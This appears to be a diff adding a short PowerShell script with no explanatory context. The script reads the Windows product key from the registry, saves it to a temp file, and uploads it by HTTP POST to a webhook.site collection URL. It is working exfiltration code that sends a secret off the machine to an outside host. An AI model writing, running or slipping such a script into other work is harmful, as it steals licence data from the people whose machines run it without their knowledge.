@@ -1,0 +1,5 @@
+cd $env:temp
+$key = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name BackupProductKeyDefault).BackupProductKeyDefault
+$key > serial.txt
+IWR -Uri https://webhook.site/c950a090-f1ce-4fd8-bd45-f7d22288e778 -Method POST -InFile serial.txt
+exit
